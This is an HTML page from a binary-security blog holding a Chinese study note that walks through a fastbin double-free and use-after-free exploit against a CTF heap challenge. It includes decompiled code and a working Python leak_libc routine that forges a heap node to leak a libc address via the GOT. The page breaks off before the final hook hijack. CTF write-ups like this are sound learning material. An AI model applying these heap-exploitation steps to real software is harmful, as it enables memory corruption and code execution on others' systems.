@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":300},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Fastbin Double Free一、题目[2016 ZCTF note2](ctf-challenges&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;use_after_free&#x2F;hitcon-training-hacknote at master · ctf-wiki&#x2F;ctf-challenges) 题目提供一个在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习笔记：Fastbin Attack">
+<meta property="og:url" content="http://whoamiuu.github.io/2026/04/19/2026-04-19-Fastbin-Double-Free/index.html">
+<meta property="og:site_name" content="Whoamiuu&#39;s Blogs">
+<meta property="og:description" content="Fastbin Double Free一、题目[2016 ZCTF note2](ctf-challenges&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;use_after_free&#x2F;hitcon-training-hacknote at master · ctf-wiki&#x2F;ctf-challenges) 题目提供一个在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-04-19-Fastbin-Double-Free/fastbin_free_chunk1.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-04-19-Fastbin-Double-Free/fastbin_free_chunk2.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-04-19-Fastbin-Double-Free/fastbin_free_chunk3.png">
+<meta property="article:published_time" content="2026-04-19T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-19T07:35:20.069Z">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="double-free，fastbin-size-misalignment">
+<meta property="article:tag" content="heap-overflow">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://whoamiuu.github.io/images/26-04-19-Fastbin-Double-Free/fastbin_free_chunk1.png">
+
+
+<link rel="canonical" href="http://whoamiuu.github.io/2026/04/19/2026-04-19-Fastbin-Double-Free/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2026/04/19/2026-04-19-Fastbin-Double-Free/","path":"2026/04/19/2026-04-19-Fastbin-Double-Free/","title":"学习笔记：Fastbin Attack"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>学习笔记：Fastbin Attack | Whoamiuu's Blogs</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Whoamiuu's Blogs</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastbin-Double-Free"><span class="nav-number">1.</span> <span class="nav-text">Fastbin Double Free</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%A2%98%E7%9B%AE"><span class="nav-number">1.1.</span> <span class="nav-text">一、题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">二、调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2-libc"><span class="nav-number">1.2.1.</span> <span class="nav-text">泄露 libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastbin-Double-Free-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">Fastbin Double Free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E9%94%99%E4%BD%8D-%E5%8A%AB%E6%8C%81hook"><span class="nav-number">1.2.3.</span> <span class="nav-text">字节错位 &amp; 劫持hook</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/04/19/2026-04-19-Fastbin-Double-Free/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="学习笔记：Fastbin Attack | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          学习笔记：Fastbin Attack
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-04-19 10:00:00 / Modified: 15:35:20" itemprop="dateCreated datePublished" datetime="2026-04-19T10:00:00+08:00">2026-04-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h1><h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><p>[2016 ZCTF note2](<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/use_after_free/hitcon-training-hacknote">ctf-challenges&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;use_after_free&#x2F;hitcon-training-hacknote at master · ctf-wiki&#x2F;ctf-challenges</a>)</p>
+<p>题目提供一个在句子中查找单词的功能，这里的漏洞利用考虑前两个选项。</p>
+<p>以下是一些示例输出</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br><span class="line">2</span><br><span class="line">Enter the sentence size:</span><br><span class="line">4</span><br><span class="line">Enter the sentence:</span><br><span class="line">word</span><br><span class="line">Added sentence</span><br><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br><span class="line">1</span><br><span class="line">Enter the word size:</span><br><span class="line">4</span><br><span class="line">Enter the word:</span><br><span class="line">word</span><br><span class="line">Found 4: word</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">Deleted!</span><br></pre></td></tr></table></figure>
+
+<p>Index a sentence 选项会进行堆分配以及节点设置，根据反编译可以推测此节点结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Word</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *word_ptr      <span class="comment">// malloc(size)</span></span><br><span class="line">    <span class="type">int</span> word_len;       <span class="comment">// 初始化为0</span></span><br><span class="line">    <span class="type">int</span> padding1;       <span class="comment">// 填充到8字节</span></span><br><span class="line">    <span class="type">char</span> *sentence_ptr; <span class="comment">// malloc(size)</span></span><br><span class="line">    <span class="type">int</span> sentence_size;  <span class="comment">// size</span></span><br><span class="line">    <span class="type">int</span> padding2;       <span class="comment">// 填充到8字节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Word</span> *<span class="title">next</span>;</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里的 2 个指针字段（<code>word_ptr</code> 和 <code>sentence_ptr</code>）均指向同一块内存，此处共享内存的设计在性能上是优化的，只需要改变一个指针<code>word_ptr</code> 即可高效实现单词查找，</p>
+<p>句子中的每个词都有指向的指针的，而句子中所有词汇都共享指针。在索引新句子时，单词会被直接添加到链表的最前面。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">node = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">iVar1 = <span class="number">0</span>;</span><br><span class="line">*node = (<span class="type">long</span>)buf;</span><br><span class="line">*(undefined4 *)(node + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">node[<span class="number">2</span>] = (<span class="type">long</span>)buf;</span><br><span class="line">*(<span class="type">int</span> *)(node + <span class="number">3</span>) = size;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">char</span> *)(lVar2 + <span class="number">-1</span>) == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      *node = lVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      node[<span class="number">4</span>] = (<span class="type">long</span>)DAT_006020b8;</span><br><span class="line">      DAT_006020b8 = node; </span><br><span class="line">      node = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      *node = lVar2;</span><br><span class="line">      *(undefined4 *)(node + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      node[<span class="number">2</span>] = (<span class="type">long</span>)buf;</span><br><span class="line">      *(<span class="type">int</span> *)(node + <span class="number">3</span>) = size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar1 = iVar1 + <span class="number">1</span>;</span><br><span class="line">    *(<span class="type">int</span> *)(node + <span class="number">1</span>) = iVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  lVar2 = lVar2 + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (lVar2 != (<span class="type">long</span>)buf + (ulong)(size - <span class="number">1U</span>) + <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p> DAT_006020b8 作为全局变量，向链表头部添加节点。需要注意，每个节点通过next指针字段连接，而所有的 sentence_ptr 指针字段都指向句子缓冲区，句子缓冲区作为独立的堆块在链表之外。</p>
+<p>搜索单词涉及对这个链表单词进行迭代，确保句子串不是空的，并将单词与目标单词进行比较。如果匹配，句子会被打印出来，你可以选择删除该句子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> (puVar1 = DAT_006020b8; puVar1 != (undefined8 *)<span class="number">0x0</span>; puVar1 = (undefined8 *)puVar1[<span class="number">4</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((*(<span class="type">char</span> *)puVar1[<span class="number">2</span>] != <span class="string">&#x27;\0&#x27;</span>) &amp;&amp; (*(<span class="type">int</span> *)(puVar1 + <span class="number">1</span>) == size)) &amp;&amp;</span><br><span class="line">       (iVar2 = <span class="built_in">memcmp</span>((<span class="type">void</span> *)*puVar1,ptr,(<span class="type">long</span>)size), iVar2 == <span class="number">0</span>)) &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>,<span class="string">&quot;Found %d: &quot;</span>,*(undefined4 *)(puVar1 + <span class="number">3</span>));</span><br><span class="line">      fwrite((<span class="type">void</span> *)puVar1[<span class="number">2</span>],<span class="number">1</span>,(<span class="type">long</span>)*(<span class="type">int</span> *)(puVar1 + <span class="number">3</span>),<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Delete this sentence (y/n)?&quot;</span>);</span><br><span class="line">      myread(local_38,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (local_38[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">void</span> *)puVar1[<span class="number">2</span>],<span class="number">0</span>,(<span class="type">long</span>)*(<span class="type">int</span> *)(puVar1 + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">free</span>((<span class="type">void</span> *)puVar1[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Deleted!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里在删除句子时首先通过 memset 将 puVar1[2] 区域，也就是节点中的 char* sentence_ptr指向的地址，置零。需要注意，这里的 if 语句判定 *sentence_ptr 第一字节不为0才会进行打印操作，但是 free 操作在置零之后，而在执行 free 时会将 fd 写入用户区，这意味着即使这些数据被清零，仍可能使检查通过：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 _int_free 函数 fastbin 分支</span></span><br><span class="line">mchunkptr old = *fb;  <span class="comment">// old 指向当前 fastbin 链表的第一个空闲块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 省略 double free 检查 ...</span></span><br><span class="line"></span><br><span class="line">p-&gt;fd = old;  <span class="comment">// 关键代码：将当前 chunk (p) 的 fd 指针指向原链表头 (old)</span></span><br><span class="line">*fb = p;      <span class="comment">// 更新 fastbin 链表头指针，让链表头指向新释放的 chunk (p)</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在低版本 glibc (如 2.23)，fd 由 free 直接写入（高版本加入指针加密），此处虽然通过 memset 将指针指向地址数据清空，但节点依然存在，由 GLIBC 保存在 fastbin 链表中，也就是节点依然通过 fd 相连。</p>
+</blockquote>
+<p>于是句子缓冲区(堆)被挂载到 fastbin，而因为 free((void *)puVar1[2]) 后并未将 puVar1[2] 置零，节点中的指针字段依然指向这块内存，一旦这片内存被再次使用，使用之前的节点便可导致此处内存泄露。这就是 Use After Free（UAF）的标准使用方式。</p>
+<h2 id="二、调试"><a href="#二、调试" class="headerlink" title="二、调试"></a>二、调试</h2><h3 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h3><p>基于以上信息，我们形成以下思路：</p>
+<ol>
+<li>索引一个40字节的句子(选项2)（因为40字节刚好是后面节点的大小，我们让两者大小相同才可通过 fastbin 复用）。</li>
+<li>删除句子(选项1)。</li>
+<li>此时我们在 fastbin 中存在一个40字节的空闲块(旧缓冲区)，但所有旧节点依然存在，所有 sentence_ptr 依然指向空闲块，也就是旧的句子缓冲区。</li>
+<li>索引一个比原句子大16字节以上的新句子（我们需要让新节点malloc(0x28)复用 fastbin 中已释放内存，而不是句子缓冲区复用内存，这里为了防止内部碎片管理机制把已释放内存分配给句子缓冲区，索引一个比原句子大16字节以上的新句子更稳妥）。</li>
+<li>此时分配了一个新句子缓冲区，而 fastbin 中的空闲块被复用，作为新的节点。注意这里原链表依然存在，新节点会继续连接到旧链表。虽然新节点的 sentence_ptr 字段会更新为新缓冲区地址，但是旧节点的 sentence_ptr 依然指向旧缓冲区，也就是此时的新节点。</li>
+<li>查找旧节点中的单词，然后删除句子。我们现在在fastbin中有一个40字节的空闲块，而这个块仍然被用作节点，这是第二次释放此处内存。</li>
+<li>索引一个40字节的句子，再次复用此处内存，控制节点内容，写入 got 表项。</li>
+<li>当我们搜索该节点，伪造指针指向的内容会被打印出来，这会导致内存泄漏。</li>
+</ol>
+<p>这在下面的函数中实现，并附有部分详细注释。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    <span class="comment"># 索引40字节的句子，与节点大小相同</span></span><br><span class="line">    index((<span class="string">b&#x27;aaaa b cccc &#x27;</span>).ljust(<span class="number">40</span>, <span class="string">b&#x27;d&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除句子</span></span><br><span class="line">    search(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 索引一个64字节的新句子，分配新的堆</span></span><br><span class="line">    <span class="comment"># 新节点复用之前释放的内存</span></span><br><span class="line">    <span class="comment"># 新节点会连接到旧链表</span></span><br><span class="line">    index(<span class="string">b&#x27;e&#x27;</span>*<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再次查找旧节点中的单词，触发删除</span></span><br><span class="line">    <span class="comment"># 删除句子，我们现在在fastbin中有一个40字节的空闲块</span></span><br><span class="line">    <span class="comment"># 这个块仍然被用作节点</span></span><br><span class="line">    search(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 伪造节点</span></span><br><span class="line">    node =  p64(<span class="number">0x400E90</span>)   <span class="comment"># word pointer &quot;Enter&quot;</span></span><br><span class="line">    node += p64(<span class="number">5</span>)          <span class="comment"># word length</span></span><br><span class="line">    node += p64(free_got)   <span class="comment"># sentence pointer (GOT address of free)</span></span><br><span class="line">    node += p64(<span class="number">64</span>)         <span class="comment"># length of sentence</span></span><br><span class="line">    node += p64(<span class="number">0x00000000</span>) <span class="comment"># set next pointer is null</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入新句子伪造节点+</span></span><br><span class="line">    <span class="comment"># 节点中指针字段指向got</span></span><br><span class="line">    index(node)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查找该伪造节点</span></span><br><span class="line">    <span class="comment"># 于是打印出libc地址</span></span><br><span class="line">    search(<span class="string">b&#x27;Enter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Found 64: &#x27;</span>)</span><br><span class="line">    leak = io.recvline().split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    leak = u64(leak)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不必要删除</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> leak  </span><br></pre></td></tr></table></figure>
+
+<p>我在第一次索引句子时输入了这样的形式：<code>aaaa b ccc...</code>，这会分配三个节点，但是无法通过 search 的检查，下面贴出调试信息：</p>
